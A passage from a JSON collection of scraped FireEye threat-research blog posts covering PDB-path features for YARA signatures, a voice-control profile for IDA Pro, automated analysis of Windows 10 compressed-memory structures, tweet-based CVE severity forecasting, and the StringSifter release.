PDB filename itself was not normalized. In this case we wanted to derive features from the filename itself, so we left it. Other approaches could be to normalize it, or even to make note that the same filename string ‘mkzyu91952’ appears earlier in the path. There are endless possible features when dealing with file paths. Directory Analysis Once we had normalized directories, we could start to “tokenize” each directory term, to start performing some statistical analysis. Our main goal of this analysis was to see if there were any directory terms that highly corresponded to maliciousness, or see if there were any simple combinations, such as pairs or triplets, that exhibited similar behavior. We did not find any single directory name that easily separated the classes. That would be too easy. However, we did find some general correlations with directories such as “Desktop” being somewhat more likely to be malicious, and use of shared drives such as Z: to be more indicative of a benign file. This makes intuitive sense given the more collaborative environment a “legitimate” software development process might require. There are, of course, many exceptions and this is what makes the problem tricky. Another strong signal we found, at least in our dataset, is that when the word “Desktop” was in a non-English language and particularly in a different alphabet, the likelihood of that PDB path being tied to a malicious file was very high (Figure 2). While potentially useful, this can be indicative of geographical bias in our dataset, and further research would need to be done to see if this type of signature would generalize. Figure 2: Unicode desktop folders from malicious samples Various Tokenizing Schemes In recording the directories of a file path, there are several ways you can represent the path. Let’s use this path to illustrate these different approaches: c:\\Leave\\smell\\Long\\ruleThis.pdb ( file ) Bag of Words One very simple way is the “ bag-of-words ” approach, which simply treats the path as the distinct set of directory names it contains. Therefore, the aforementioned path would be represented as: [‘c:’,’leave’,’smell’,’long’,’rulethis’] Positional Analysis Another approach we considered was recording the position of each directory name, as a distance from the drive. This retained more information about depth, such that a ‘build’ directory on the desktop would be treated differently than a ‘build’ directory nine directories further down. For this purpose, we excluded the drives since they would always have the same depth. [’leave_1’,’smell_2’,’long_3’,’rulethis_4’] N-Gram Analysis Finally, we explored breaking paths into n-grams; that is, as a distinct set of n- adjacent directories. For example, a 2-gram representation of this path might look like: [‘c:\\leave’,’leave\\smell’,’smell\\long’,’long\\rulethis’] We tested each of these approaches and while positional analysis and n-grams contained more information , in the end, bag-of-words seemed to generalize best. Additionally, using the bag-of-words approach made it easier to extract simple signature logic from the resultant models, as will be shown in a later section. Term Co-Occurrence Since we had the bag-of-words vectors created for each path, we were also able to evaluate term co-occurrence across benign and malicious files. When we evaluated the co-occurrence of pairs of terms, we found some other interesting pairings that indeed paint two very different pictures of development environments (Figure 3). Correlated with Malicious Files Correlated with Benign Files users, desktop src, retail documents, visual studio 2012 obj, x64 local, temporary projects src, x86 users, projects src, win32 users, documents retail, dynamic appdata, temporary projects src, amd64 users, x86 src, x64 Figure 3: Correlated pairs with malicious and benign files Keyword Lists Our bag-of-words representation of the PDB paths then gave us a distinct set of nearly 70,000 distinct terms. The vast majority of these terms occurred once or twice in the entire dataset, resulting in what is known as a ‘long-tailed’ distribution. Figure 4 is a graph of only the top 100 most common terms in descending order. Figure 4: Long tailed distribution of term occurrence As you can see, the counts drop off quickly, and you are left dealing with an enormous amount of terms that may only appear a handful of times. One very simple way to solve this problem, without losing a ton of information, is to simply cut off a keyword list after a certain number of entries. For example, take the top 50 occurring folder names (across both good and bad files), and save them as a keyword list. Then match this list against every path in the dataset. To create features, one-hot encode each match. Rather than arbitrarily setting a cutoff, we wanted to know a bit more about the distribution and understand where might be a good place to set a limit – such that we would cover enough of the samples without drastically increasing the number of features for our model. We therefore calculated the cumulative number of samples covered by each term, as we iterated down the list from most common to least common. Figure 5 is a graph showing the result. Figure 5: Cumulative share of samples covered by distinct terms As you can see, with only a small fraction of the terms, we can arrive at a significant percentage of the cumulative total PDB paths. Setting a simple cutoff at about 70% of the dataset resulted in roughly 230 terms for our total vocabulary. This gave us enough information about the dataset without blowing up our model with too many features (and therefore, dimensions). One-hot encoding the presence of these terms was then the final step in featurizing the directory names present in the paths. YARA Signatures Do Grow on Trees Armed with some statistical features, as well as one-hot encoded keyword matches, we began to train some models on our now-featurized dataset. In doing so, we hoped to use the model training and evaluation process to give us insights into how to build better signatures. If we developed an effective classification model, that would be an added benefit. We felt that tree-based models made sense for this use case for two reasons. First, tree-based models have worked well in the past in domains requiring a certain amount of interpretability and using a blend of quantitative and categorical features. Second, the features we used are largely things we could represent in a YARA signature. Therefore, if our models built boolean logic branches that separated large numbers of PDB files, we could potentially translate these into signatures. This is not to say that other model families could not be used to build strong classifiers. Many other options ranging from Logistic Regression to Deep Learning could be considered. We fed our featurized training set into a Decision Tree , having set a couple ‘hyperparameters’ such as max depth and minimum samples per leaf, etc. We were also able to use a sliding scale of these hyperparameters to dynamically create trees and, essentially, see what shook out. Examining a trained decision tree such as the one in Figure 6 allowed us to immediately build new signatures. Figure 6: Example decision tree and decision paths We found several other interesting tidbits within our decision trees. Some terms that resulted in completely or almost-completely malicious subgroups are: Directory Term Example Hashes \\poe\\ a6b2aa2b489fb481c3cd9eab2f4f4f5c 92904dc99938352525492cd5133b9917 444be936b44cc6bd0cd5d0c88268fa77 \\xampp\\ 4d093061c172b32bf8bef03ac44515ae 4e6c2d60873f644ef5e06a17d85ec777 52d2a08223d0b5cc300f067219021c90 \\temporary projects\\ a785bd1eb2a8495a93a2f348c9a8ca67 c43c79812d49ca0f3b4da5aca3745090 e540076f48d7069bacb6d607f2d389d9 \\stub\\ 5ea538dfc64e28ad8c4063573a46800c adf27ce5e67d770321daf90be6f4d895 c6e23da146a6fa2956c3dd7a9314fc97 We also found the term ‘WindowsApplication1’ to be quite useful. 89% of the files in our dataset containing this directory were malicious. Cursory research indicates that this is the default directory generated when using Visual Studio to compile a Windows binary. Once again, this makes some intuitive sense for finding malware authors. Training and evaluating decision trees with various parameters turned out to be a hugely productive exercise in discovering potential new signature terms and logic. Classification Accuracy and Findings Since we now had a large dataset of PDB paths and features, we wanted to see if we could train a traditional classifier to separate good files from bad. Using a Random Forest with some tuning, we were able to achieve an average accuracy of 87% over 10 cross validations. However, while our recall (the percentage of bad things we could identify with the model) was relatively high at 89%, our malware precision (the share of those things we called bad that were actually bad) was far too low, hovering at or below 50%. This indicates that using this model alone for malware detection would result in an unacceptably large number of false positives, were we to deploy it in the wild as a singular detection platform. However, used in conjunction with other tools, this could be a useful weak signal to assist with analysis. Conclusion and Next Steps While our journey of statistical PDB analysis did not yield a magic malware classifier, it did yield a number of useful findings that we were hoping for: We developed several file path feature functions which are transferable to other models under development. By diving into statistical analysis of the dataset, we were able to identify new keywords and logic branches to include in YARA signatures. These signatures have since been deployed and discovered new malware samples. We answered a number of our own general research questions about PDB paths, and were able to dispel some theories we had not fully tested with data. While building an independent classifier was not the primary goal, improvements can surely be made to improve the end model accuracy. Generating an even larger, more diverse dataset would likely make the biggest impact on our accuracy, recall, and precision. Further hyperparameter tuning and feature engineering could also help. There is a large amount of established research into text classification using various deep learning methods such as LSTMs , which could be applied effectively to a larger dataset. PDB paths are only one small family of file paths that we encounter in the field of cyber security. Whether in initial infection, staging, or another part of the attack lifecycle, the file paths found during forensic analysis can reveal incredibly useful information about adversary activity. We look forward to further community research on how to properly extract and represent that information. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/10/controlling-ida-pro-with-voice-control-software.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2019-10-03",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction This blog post is the next episode in the FireEye Labs Advanced Reverse Engineering (FLARE) team Script Series. Today, we are sharing something quite unusual. It is not a tool or a virtual machine distribution, nor is it a plugin or script for a popular reverse engineering tool or framework. Rather, it is a profile created for a consumer software application completely unrelated to reverse engineering or malware analysis… until now. The software is named VoiceAttack , and its purpose is to make it easy for users to control other software on their computer using voice commands. With FLARE’s new profile for VoiceAttack , users can completely control IDA Pro with their voice! Have you ever dreamed of telling IDA Pro to decompile a function or show you the strings of a binary? Well dream no more! Not only does our profile give you total control of the software, it also provides shortcuts and other cool features not previously available. It’s our hope that providing voice control for the world’s most popular disassembler will further empower users with repetitive stress injuries or disabilities to more effectively put their reverse engineering skills to use with this new accessibility option as well as helping the community at large work more efficiently. Check out our video demonstration of some of the features of the profile to see it in action. &amp;amp;nbsp; How Does It Work? Voice attack is an inexpensive software application that utilizes the Windows Speech Recognition (WSR) feature to enable the creation of user-defined, voice-activated macros. The user specifies a key word or phrase, then defines one or more actions to be taken when that word or phrase is recognized. The most common types of actions to be taken include key presses, mouse movement and clicks, and clipboard manipulation. However, there are many other more advanced features available that provide a lot of flexibility to users including variables, loops, and conditionals. You can even have the computer speak to you in response to your commands! VoiceAttack requires an internet connection, but only during the registration process, after which the network adapter can be disabled or configured to a network that cannot reach the internet without issue. To use VoiceAttack, you must first train Windows Speech Recognition to recognize your voice. Instructions on how to do so can be found here . This process only takes a few minutes at minimum, but the more time you spend training, the better the experience you will have with it. What Does the IDA Pro Profile Provide? FLARE’s IDA Pro profile for VoiceAttack maps every advertised keyboard shortcut in IDA Pro to a voice command. Although this is only one part of what the profile provides, many users will find this in itself very useful. When developing this profile, I was shocked to discover just how many keyboard shortcuts there really are for IDA Pro and what can be accomplished with them. Some of my favorite shortcuts are found under the View->Open Subviews and Windows menus. With this profile, I can simply say “show strings” or “show structures” or “show window x” to change the tab I am currently viewing or open a new view in a tab without having to move my mouse cursor anywhere. The next few paragraphs describe some other useful commands to make any reverse engineer’s job easier. For a more detailed description of the profile and commands available, see the Github page . Macros A series of voice commands can perform multi-step actions not otherwise reachable by individual keyboard shortcuts. For example, wouldn’t it be nice to have commands to toggle the visibility of opcode bytes (see Figure 1)? Currently, you have to open the Options menu, select the General menu item, input a value in the Number of opcode bytes text field, and click the OK button. Well, now you can simply say “show opcodes” or “hide opcodes” and it will be so! Figure 1: Configuring the number of opcode bytes to show in IDA Pro's disassembly view Defining a Unicode string in IDA Pro is a multi-step exercise, whether you navigate to the Edit->Strings menu or use the “string literals” keyboard shortcut Alt+A followed by pressing the U key as shown in Figure 2. Now you can simply say “make Unicode string” and the work is done for you. Figure 2: String literals dialog in IDA Pro Reversing a C++ application? The Create struct from selection action is a very helpful feature in this case, but it requires you to navigate to the Edit->Structs menu in order to use it. The voice command “create struct from selection” does this for you automatically. The “look it up” command will copy the currently highlighted token in the disassembly and search Google for it using your default browser. There are several other macros in the profile that are like this and save you a lot of time navigating menus and dialogs to perform simple actions. Cursor Movement, Dialogs, and Navigation The cursor movement commands allow the user to move the cursor up, down, left, or right, one or more times, in specified increments. These commands also allow for scrolling with a voice command that commences scrolling in a chosen direction, and another voice command for stopping scrolling. There are even voice commands to set the speed of the scroll to slow, medium, or fast. In the disassembly view, the cursor can also be moved per “word” on the current line of the disassembly or decompilation, or even per basic block or function. Like many other applications, dialogs are a part of IDA Pro’s user interface. The ability to easily navigate and interact with items in a dialog with your voice is essential to a smooth user experience. Voice commands in the profile enable the user to easily click the OK or Cancel buttons, toggle checkboxes, and tab through controls in the dialog in both directions and in specified increments. With the aid of a companion IDAPython plugin , additional navigation commands are supported. Commands that allow the user to move the cursor to the beginning or end of the current function, to the next or previous “call” instruction, to the previous or next instruction containing the highlighted token, or to a specified number of bytes forward or backwards from the current cursor position help to make voice-controlled navigation easier. These cursor movement and navigation commands enable users to have full control of IDA Pro without the use of their hands. While this is true and an important goal for the profile, it is not practical for people who have full use of their hands to go completely hands-free. The commands that navigate the cursor in IDA Pro will never be as fast or easy as simply using the mouse to point and click somewhere on the screen. In any case, users will find themselves building up a collection of voice commands they prefer to use that will depend on personal tastes. However, enabling full voice control allows reverse engineers who do not have full use of their hands to still effectively operate IDA Pro, which we hope will be of great use to the community. Having such a capability is also useful for those who suffer from repetitive strain injury . Input Recognition The commands described so far give you control over IDA Pro with your voice, but there is still the matter of providing textual input for items such as function and variable names, comments, and other text input fields. VoiceAttack does provide the ability in macros to enable and disable what is called “Dictation Mode”. When in Dictation Mode, any recognized words are added to a buffer of text until Dictation Mode is disabled. Then this text can be used elsewhere in the macro. Unfortunately, this feature is not designed to recognize the kinds of technical terms one would be using in the context of reverse engineering programs. Even if it were, there is still the issue of having to format the text to be a valid function or variable name. Instead of wrestling with this feature to try to make it work for this purpose, a very large and growing collection of “input recognition” commands was created. These commands are designed to recognize common words used in the names of functions and variables, as well as full function names as found in the C runtime libraries and the Windows APIs. Once recognized, the word or function name is copied to the user’s clipboard and pasted into the text field. To avoid the inadvertent triggering of such commands during the regular operation of IDA Pro, these commands are only active when the “input mode” is enabled. This mode is enabled automatically when certain commands are activated such as “rename” or “find”, and automatically disabled when dialog commands such as “OK” or “cancel” are activated. The input mode can also be manually manipulated with the “input mode on” and “input mode off” commands. Conclusion Today, the FLARE team is releasing a profile for VoiceAttack and a companion IDAPython plugin that enables full voice control of IDA Pro along with many added convenience features. The profile contains over 1000 defined commands and growing. It is easy to view, edit, and add commands to this profile to customize it to suit your needs or to improve it for the community at large. The VoiceAttack software is highly affordable and enables you to create profiles for any applications or games that you use. For installation instructions and usage information, see the project’s Github page . Give it a try today! Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/08/finding-evil-in-windows-ten-compressed-memory-part-three.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2019-08-08",
                    "source": "www.fireeye.com"
                },
                "text": "This is the final post in the three-part series: Finding Evil in Windows 10 Compressed Memory . In the first post ( Volatility and Rekall Tools ), the FLARE team introduced updates to both memory forensic toolkits. These updates enabled these open source tools to analyze previously inaccessible compressed data in memory. This research was shared with the community at the 2019 SANS DFIR Austin conference and is available on GitHub ( Volatility and Rekall ). In the second post ( Virtual Store Deep Dive ), we looked at the structures and algorithms involved in locating and extracting compressed pages from the Store Manager. The post included a walkthrough of a memory dump designed for analysts to be able to recreate in their own Windows 10 environments. The structures referenced in the walkthrough were all previously analyzed in a disassembler, a manual effort which came in at around eight hours. As you’d expect, this task quickly became a candidate for automation. Our analysis time is now under two minutes! This final post accompanies my and Dimiter Andonov's BlackHat USA 2019 talk with the series title and seeks to describe the challenges faced in maintaining software that ultimately relies on undocumented structures. Here we introduce a solution to reduce the level of effort of analyzing undocumented structures. Overview Undocumented structures within the Windows kernel are always subject to change. The flexibility granted by not publicizing a structure’s composition can be invaluable to a development team. It can allow for the system to grow unencumbered by the need to update helper functions and public documentation. In many cases, even when a publicly available API designed to access the undocumented structures can be leveraged on a live system, incident responders and memory forensic analysts don’t have the luxury of utilizing them. DFIR analysts operating on memory extractions or snapshots ultimately using tools which must recreate the job of an API by manually parsing and traversing structures and reimplementing algorithms used. Unfortunately, these structures and algorithms are not always up to date in the analysts’ toolkit, leading to incomplete extractions or completely broken investigations. These tools may cease to work after any given update. This is the case with the Windows kernel’s Store Manager component. Structures relied on to locate compressed data in RAM are constantly evolving. This requires some flexibility built into the plugins and a means of reducing the analysis time required to reconstruct these structures. Leveraging flare-emu To ease my Store Manager analysis efforts, I looked into Tom Bennett’s flare-emu utility . flare-emu can be viewed as the marriage of IDA Pro with the Unicorn emulation engine. The original use of the framework was to clean up Objective-C function call names due to ambiguity stemming from the unknown id argument for calls to objc_msgSend . Tom was able to use emulation to resolve the ambiguity and clean up his analysis environment. The value I saw in the framework was that the barrier to entry for using Unicorn was now lowered to a point where it could be used to rapidly prototype ideas. flare-emu handles PE loading, memory faults, and function calls while guaranteeing traversal over code you would like to reach. After analyzing a dozen Windows 10 kernels, I had become familiar enough with the process to begin automating the effort. The automation of undocumented structures and algorithms requires one or more of the following properties to remain constant across builds. Structure locations Function prototypes Order of structure memory access Structure field usage Callstacks Let’s explore the example of locating the offset of ST_DATA_MGR.wCompressionFormat . As shown in Figure 1, this field is the first argument to RtlDecompressBufferEx . This function is publicly available and documented. This is how we originally derived that offset 0x220 in the ST_DATA_MGR structure corresponded to the compression format of the store page in Windows 10 1703 (x86). Figure 1: Call to RtlDecompressBuferEx, note that the compression format originates from ST_DATA_MGR To leverage flare-emu in automating the extraction of the value 0x220, we have a few options. For example, from analysis of other kernels, we know that the access to ST_DATA_MGR immediately before decompression is likely to be the compression format. In this case, a stronger extraction algorithm can be leveraged by prepopulating ST_DATA_MGR with a known pattern (see Figure 2). Figure 2: Known pattern copied into ST_DATA_MGR buffer Using flare-emu, we emulate the function in which this call is located and examine the stack post-emulation. 0x20101000 0x1163 0x31001200 0x1423 0x20001400 “Km” Figure 3: Post-emulation stack layout Knowing that the wCompressionFormat argument originated from the ST_DATA_MGR structure, we see that it is now “Km”. If we were to search for that value in the known pattern, we would find that it begins at offset 0x220. Check out Figure 4 to see how we can leverage flare-emu to solve this challenge. Figure 4: Code snippet from w10deflate_auto project demonstrating the automation of wCompressionFormat The decorators preceding the function signify that the extraction algorithm will work on both 32-bit and 64-bit architectures. After generating a known pattern using a helper function within my project, flare-emu is used to allocate a buffer, storing a pointer to it in lp_stdatamgr . The pointer is written into the ECX register because I know that the first argument to the parent function, StDmSinglePageCopy is the pointer to the ST_DATA_MGR structure. The pHook function populates ECX prior to the emulation run. The helper function locate_call_in_fn is usedto perform a relaxed search for RtlDecompressBufferEx within StDmSinglePageCopy . Using flare-emu’s iterate function, I force emulation to reach decompression, at which point I read the first item on the stack and then search for it within my known pattern. Techniques like the one described above are ultimately used to retrieve all structure fields involved in the page decompression and can be leveraged in other situations in which an undocumented structure may need tracking across Windows builds. Figure 5 shows the automation utility extracting the fields of the undocumented structures used by the Volatility and Rekall plugins. Figure 5: Output of automation from within IDA Pro Keeping Volatility and Rekall Updated The data generated by the automation script is primarily useful when implemented in Volatility and Rekall. In both Volatility and Rekall, the win10_memcompression.py overlay contains all structure definitions needed for page location and decompression. Figure 6 shows a snippet from the file in which the Windows 10 1903 x86 profile is created. Figure 6: Structure definition found within w10_memcompression.py overlay Create a new profile dictionary (ex. win10_mem_comp_x86_1903 ) corresponding to the Windows build that you are targeting and populate the structure entries accordingly. Conclusion Undocumented structures pose a challenge to those who rely on them. This blog post covered how flare-emu can be leveraged to reduce the level of effort needed to analyze new files. We analyzed the extraction of an ST_DATA_MGR field used in page decompression by presenting the problem and then the code involved with automating the effort. The automation code is available on the FireEye GitHub with usage information and documentation available in both the README and code. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/08/automated-prioritization-of-software-vulnerabilities.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2019-08-13",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction If a software vulnerability can be detected and remedied, then a potential intrusion is prevented. While not all software vulnerabilities are known, 86 percent of vulnerabilities leading to a data breach were patchable , though there is s o m e risk of inadvertent damage when applying software patches. When new vulnerabilities are identified they are published in the Common Vulnerabilities and Exposures (CVE) dictionary by vulnerability databases , such as the National Vulnerability Database (NVD). The Common Vulnerabilities Scoring System (CVSS) provides a metric for prioritization that is meant to capture the potential severity of a vulnerability. However, it has been criticized for a lack of timeliness, vulnerable population representation, normalization, rescoring and broader expert consensus that can lead to disagreements . For example, some of the worst exploits have been assigned low CVSS scores. Additionally, CVSS does not measure the vulnerable population size, which many practitioners have stated they expect it to score. The design of the current CVSS system leads to too many severe vulnerabilities, which causes user fatigue. ­ To provide a more timely and broad approach, we use machine learning to analyze users’ opinions about the severity of vulnerabilities by examining relevant tweets. The model predicts whether users believe a vulnerability is likely to affect a large number of people, or if the vulnerability is less dangerous and unlikely to be exploited. The predictions from our model are then used to score vulnerabilities faster than traditional approaches, like CVSS, while providing a different method for measuring severity, which better reflects real-world impact. Our work uses nowcasting to address this important gap of prioritizing early-stage CVEs to know if they are urgent or not. Nowcasting is the economic discipline of determining a trend or a trend reversal objectively in real time. In this case, we are recognizing the value of linking social media responses to the release of a CVE after it is released, but before it is scored by CVSS. Scores of CVEs should ideally be available as soon as possible after the CVE is released, while the current process often hampers prioritization of triage events and ultimately slows response to severe vulnerabilities. This crowdsourced approach reflects numerous practitioner observations about the size and widespread nature of the vulnerable population, as shown in Figure 1. For example, in the Mirai botnet incident in 2017 a massive number of vulnerable IoT devices were compromised leading to the largest Denial of Service (DoS) attack on the internet at the time. Figure 1: Tweet showing social commentary on a vulnerability that reflects severity Model Overview Figure 2 illustrates the overall process that starts with analyzing the content of a tweet and concludes with two forecasting evaluations. First, we run Named Entity Recognition (NER) on tweet contents to extract named entities. Second, we use two classifiers to test the relevancy and severity towards the pre-identified entities. Finally, we match the relevant and severe tweets to the corresponding CVE. Figure 2: Process overview of the steps in our CVE score forecasting Each tweet is associated to CVEs by inspecting URLs or the contents hosted at a URL. Specifically, we link a CVE to a tweet if it contains a CVE number in the message body, or if the URL content contains a CVE. Each tweet must be associated with a single CVE and must be classified as relevant to security-related topics to be scored. The first forecasting task considers how well our model can predict the CVSS rankings ahead of time. The second task is predicting future exploitation of the vulnerability for a CVE based on Symantec Antivirus Signatures and Exploit DB. The rationale is that eventual presence in these lists indicates not just that exploits can exist or that they do exist, but that they also are publicly available. Modeling Approach Predicting the CVSS scores and exploitability from Twitter data involves multiple steps. First, we need to find appropriate representations (or features) for our natural language to be processed by machine learning models. In this work, we use two natural language processing methods in natural language processing for extracting features from text: (1) N-grams features, and (2) Word embeddings. Second, we use these features to predict if the tweet is relevant to the cyber security field using a classification model. Third, we use these features to predict if the relevant tweets are making strong statements indicative of severity. Finally, we match the severe and relevant tweets up to the corresponding CVE. N-grams are word sequences, such as word pairs for 2-gram or word triples for 3-grams. In other words, they are contiguous sequence of n words from a text. After we extract these n-grams, we can represent original text as a bag-of-ngrams. Consider the sentence: A criticial vulnerability was found in Linux. If we consider all 2-gram features, then the bag-of-ngrams representation contains “A critical”, “critical vulnerability”, etc. Word embeddings are a way to learn the meaning of a word by how it was used in previous contexts, and then represent that meaning in a vector space. Word embeddings know the meaning of a word by the company it keeps, more formally known as the distribution hypothesis . These word embedding representations are machine friendly, and similar words are often assigned similar representations. Word embeddings are domain specific. In our work, we additionally train terminology specific to cyber security topics, such as related words to threats are defenses , cyberrisk , cybersecurity , threat , and iot-based . The embedding would allow a classifier to implicitly combine the knowledge of similar words and the meaning of how concepts differ. Conceptually, word embeddings may help a classifier use these embeddings to implicitly associate relationships such as: device + infected = zombie where an entity called device has a mechanism applied called infected (malicious software infecting it) then it becomes a zombie . To address issues where social media tweets differ linguistically from natural language, we leverage previous research and software from the Natural Language Processing (NLP) community. This addresses specific nuances like less consistent capitalization, and stemming to account for a variety of special characters like ‘@’ and ‘#’. Figure 3: Tweet demonstrating value of identifying named entities in tweets in order to gauge severity Named Entity Recognition (NER) identifies the words that construct nouns based on their context within a sentence, and benefits from our embeddings incorporating cyber security words. Correctly identifying the nouns using NER is important to how we parse a sentence. In Figure 3, for instance, NER facilitates Windows 10 to be understood as an entity while October 2018 is treated as elements of a date. Without this ability, the text in Figure 3 may be confused with the physical notion of windows in a building. Once NER tokens are identified, they are used to test if a vulnerability affects them. In the Windows 10 example, Windows 10 is the entity and the classifier will predict whether the user believes there is a serious vulnerability affecting Windows 10 . One prediction is made per entity, even if a tweet contains multiple entities. Filtering tweets that do not contain named entities reduces tweets to only those relevant to expressing observations on a software vulnerability. From these normalized tweets, we can gain insight into how strongly users are emphasizing the importance of the vulnerability by observing their choice of words. The choice of adjective is instrumental in the classifier capturing the strong opinions. Twitter users often use strong adjectives and superlatives to convey magnitude in a tweet or when stressing the importance of something related to a vulnerability like in Figure 4. This magnitude often indicates to the model when a vulnerability’s exploitation is widespread. Table 1 shows our analysis of important adjectives that tend to indicate a more severe vulnerability. Figure 4: Tweet showing strong adjective use Table 1: Log-odds ratios for words correlated with highly-severe CVEs Finally, the processed features are evaluated with two different classifiers to output scores to predict relevancy and severity. When a named entity is identified all words comprising it are replaced with a single token to prevent the model from biasing toward that entity. The first model uses an n-gram approach where sequences of two, three, and four tokens are input into a logistic regression model. The second approach uses a one-dimensional Convolutional Neural Network (CNN), comprised of an embedding layer, a dropout layer then a fully connected layer, to extract features from the tweets. Evaluating Data To evaluate the performance of our approach, we curated a dataset of 6,000 tweets containing the keywords vulnerability or ddos from Dec 2017 to July 2018. Workers on Amazon’s Mechanical Turk platform were asked to judge whether a user believed a vulnerability they were discussing was severe. For all labeling, multiple users must independently agree on a label, and multiple statistical and expert-oriented techniques are used to eliminate spurious annotations. Five annotators were used for the labels in the relevancy classifier and ten annotators were used for the severity annotation task. Heuristics were used to remove unserious respondents; for example, when users did not agree with other annotators for a majority of the tweets. A subset of tweets were expert-annotated and used to measure the quality of the remaining annotations. Using the features extracted from tweet contents, including word embeddings and n-grams, we built a model using the annotated data from Amazon Mechanical Turk as labels. First, our model learns if tweets are relevant to a security threat using the annotated data as ground truth. This would remove a statement like “here is how you can #exploit tax loopholes” from being confused with a cyber security-related discussion about a user exploiting a software vulnerability as a malicious tool. Second, a forecasting model scores the vulnerability based on whether annotators perceived the threat to be severe. CVSS Forecasting Results Both the relevancy classifier and the severity classifier were applied to various datasets. Data was collected from December 2017 to July 2018. Most notably 1,000 tweets were held-out from the original 6,000 to be used for the relevancy classifier and 466 tweets were held-out for the severity classifier. To measure the performance, we use the Area Under the precision-recall Curve (AUC), which is a correctness score that summarizes the tradeoffs of minimizing the two types of errors (false positive vs false negative), with scores near 1 indicating better performance. The relevancy classifier scored 0.85 The severity classifier using the CNN scored 0.65 The severity classifier using a Logistic Regression model, without embeddings, scored 0.54 Next, we evaluate how well this approach can be used to forecast CVSS ratings. In this evaluation, all tweets must occur a minimum of five days ahead of CVSS scores. The severity forecast score for a CVE is defined as the maximum severity score among the tweets which are relevant and associated with the CVE. Table 1 shows the results of three models: randomly guessing the severity, modeling based on the volume of tweets covering a CVE, and the ML-based approach described earlier in the post. The scoring metric in Table 2 is precision at top K using our logistic regression model. For example, where K=100, this is a way for us to identify what percent of the 100 most severe vulnerabilities were correctly predicted. The random model would predicted 59, while our model predicted 78 of the top 100 and all ten of the most severe vulnerabilities. Table 2: Comparison of random simulated predictions, a model based just on quantitative features like “likes”, and the results of our model Exploit Forecasting Results We also measured the practical ability of our model to identify the exploitability of a CVE in the wild, since this is one of the motivating factors for tracking. To do this, we collected severe vulnerabilities that have known exploits by their presence in the following data sources: Symantec Antivirus signatures Symantec Intrusion Prevention System signatures ExploitDB catalog The dataset for exploit forecasting was comprised of 377,468 tweets gathered from January 2016 to November 2017. Of the 1,409 CVEs used in our forecasting evaluation, 134 publicly weaponized vulnerabilities were found across all three data sources. Using CVEs from the aforementioned sources as ground truth, we find our CVE classification model is more predictive of detecting operationalized exploits from the vulnerabilities than CVSS. Table 3 shows precision scores illustrating seven of the top ten most severe CVEs and 21 of the top 100 vulnerabilities were found to have been exploited in the wild. Compare that to one of the top ten and 16 of the top 100 from using the CVSS score itself. The recall scores show the percentage of our 134 weaponized vulnerabilities found in our K examples. In our top ten vulnerabilities, seven were found to be in the 134 (5.2%), while the CVSS scoring’s top ten included only one (0.7%) CVE being exploited. Table 3: Precision and recall scores for the top 10, 50 and 100 vulnerabilities when comparing CVSS scoring, our simplistic volume model and our NLP model Conclusion Preventing vulnerabilities is critical to an organization’s information security posture, as it effectively mitigates some cyber security breaches. In our work, we found that social media content that pre-dates CVE scoring releases can be effectively used by machine learning models to forecast vulnerability scores and prioritize vulnerabilities days before they are made available. Our approach incorporates a novel social sentiment component, which CVE scores do not, and it allows scores to better predict real-world exploitation of vulnerabilities. Finally, our approach allows for a more practical prioritization of software vulnerabilities effectively indicating the few that are likely to be weaponized by attackers. NIST has acknowledged that the current CVSS methodology is insufficient. The current process of scoring CVSS is expected to be replaced by ML-based solutions by October 2019, with limited human involvement. However, there is no indication of utilizing a social component in the scoring effort. This work was led by researchers at Ohio State under the IARPA CAUSE program, with support from Leidos and FireEye. This work was originally presented at NAACL in June 2019, our paper describes this work in more detail and was also covered by Wired . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/09/open-sourcing-stringsifter.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2019-09-07",
                    "source": "www.fireeye.com"
                },
                "text": "Malware analysts routinely use the Strings program during static analysis in order to inspect a binary's printable characters. However, identifying relevant strings by hand is time consuming and prone to human error. Larger binaries produce upwards of thousands of strings that can quickly evoke analyst fatigue, relevant strings occur less often than irrelevant ones, and the definition of \"relevant\" can vary significantly among analysts. Mistakes can lead to missed clues that would have reduced overall time spent performing malware analysis, or even worse, incomplete or incorrect investigatory conclusions. Earlier this year, the FireEye Data Science (FDS) and FireEye Labs Reverse Engineering (FLARE) teams published a blog post describing a machine learning model that automatically ranked strings to address these concerns. Today, we publicly release this model as part of StringSifter , a utility that identifies and prioritizes strings according to their relevance for malware analysis. Goals StringSifter is built to sit downstream from the Strings program; it takes a list of strings as input and returns those same strings ranked according to their relevance for malware analysis as output. It is intended to make an analyst's life easier, allowing them to focus their attention on only the most relevant strings located towards the top of its predicted output. StringSifter is designed to be seamlessly plugged into a user’s existing malware analysis stack. Once its GitHub repository is cloned and installed locally, it can be conveniently invoked from the command line with its default arguments according to: strings <sample_of_interest> | rank_strings We are also providing Docker command line tools for additional portability and usability. For a more detailed overview of how to use StringSifter, including how to specify optional arguments for customizable functionality, please view its README file on GitHub . We have received great initial internal feedback about StringSifter from FireEye’s reverse engineers, SOC analysts, red teamers, and incident responders. Encouragingly, we have also observed users at the opposite ends of the experience spectrum find the tool to be useful – from beginners detonating their first piece of malware as part of a FireEye training course – to expert malware researchers triaging incoming samples on the front lines. By making StringSifter publicly available, we hope to enable a broad set of personas, use cases, and creative downstream applications. We will also welcome external contributions to help improve the tool’s accuracy and utility in future releases. Conclusion We are releasing StringSifter to coincide with our presentation at DerbyCon 2019 on Sept. 7, and we will also be doing a technical dive into the model at the Conference on Applied Machine Learning for Information Security this October. With its release, StringSifter will join FLARE VM , FakeNet , and CommandoVM as one of many recent malware analysis tools that FireEye has chosen to make publicly available. If you are interested in developing data-driven tools that make it easier to find evil and help benefit the security community, please consider joining the FDS or FLARE teams by applying to one of our job openings . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
